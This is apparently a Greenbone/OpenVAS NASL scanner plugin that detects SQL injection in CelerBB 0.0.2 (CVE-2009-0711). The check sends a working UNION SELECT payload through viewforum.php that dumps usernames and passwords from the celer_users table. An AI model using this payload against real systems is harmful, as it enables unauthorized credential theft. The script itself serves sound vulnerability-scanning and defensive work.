if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100017" );
	script_version( "2020-10-06T06:14:16+0000" );
	script_tag( name: "last_modification", value: "2020-10-06 06:14:16 +0000 (Tue, 06 Oct 2020)" );
	script_tag( name: "creation_date", value: "2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)" );
	script_bugtraq_id( 34014 );
	script_cve_id( "CVE-2009-0711" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "CelerBB Information Disclosure and Multiple SQL Injection Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "CelerBB is prone to an information-disclosure vulnerability and
  multiple SQL-injection vulnerabilities because the application fails to sufficiently sanitize
  user-supplied data." );
	script_tag( name: "impact", value: "A successful attack could allow an attacker to obtain sensitive
  information, compromise the application, access or modify data, or exploit vulnerabilities in the
  underlying database." );
	script_tag( name: "affected", value: "CelerBB 0.0.2 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/forum", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/main.php", port: port );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	if(!ContainsString( res, "Welcome to Celer Boards!" ) && !ContainsString( res, "<h1>Celer - Bulletin Board</h1>" ) && !ContainsString( res, "<li id=\"register\"><a href=\"register.php\">Register</a></li>" ) && !ContainsString( res, "<a href=\"viewforum.php?id=" )){
		continue;
	}
	url = NASLString( dir, "/viewforum.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,GROUP_CONCAT(CONCAT(username,%200x3a,%20password,0x3a,id,0x3a,last_login)),4,5,6,7,8%20FROM%20celer_users%23" );
	if(http_vuln_check( port: port, url: url, pattern: ">.*:+.*:+[0-9]+:+[0-9]+</th>" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

